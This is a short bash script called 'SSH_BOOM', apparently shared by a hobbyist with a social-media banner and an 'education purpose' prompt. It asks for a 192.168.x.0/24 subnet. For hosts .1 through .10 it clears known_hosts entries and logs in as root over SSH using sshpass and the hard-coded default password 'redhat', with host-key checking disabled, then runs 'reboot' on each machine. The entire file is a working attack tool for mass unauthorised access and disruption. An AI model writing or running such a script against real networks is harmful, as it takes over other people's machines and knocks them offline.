#!/bin/bash
#Author: Utkarsh Singh
#Version: 2.0

echo ""
echo -e " 		      #\033[1;31m ##################################################\033[0m"
echo -e " 		      # \033[1;37mFollow me on Insta : utkarsh_.singh.__\033[0m"
echo -e " 		      # \033[1;37mAuthor : Utkarsh_Singh\033[0m"
echo -e " 		      # \033[1;31m###********************\033[0m"
echo -e " 		      # \033[6m*****\033[1;34m SSH_BOOM \033[0m\033[6m*****\033[0m"
echo -e " 		      # \033[1;31m#######\033[0m"
echo -e " 		      # \033[1;31m##\033[0m"
read -p " Only For Education Purpose? [Y/N] : " ync
while true ; do

case $ync in

	[Yy]* )

echo ""
echo "|###########################################|"
echo "| Example: 192.168.?.0/24		    |"
echo "|-------------------------------------------|"
printf "| Enter 3 octet: "
read -r "a"
echo "|###########################################|"
echo "| You're Target Network is: 192.168.$a.0/24 |"
echo "|-------------------------------------------|"
echo "| 	Press Crtl+C To Continue	    |"
echo "| ##########################################|"
echo ""
for b in $(seq 1 10)
do
	ssh-keygen -f "/root/.ssh/known_hosts" -R 192.168.$a.$b
	sshpass -p 'redhat' ssh -o StrictHostKeyChecking=no root@192.168.$a.$b 'reboot'
	echo ""
	echo "|##########################################################|"
	echo ""
	((b++))
done
echo ""
exit;;
[Nn]* )
exit;;
[Cc]* )
exit;;
esac
done
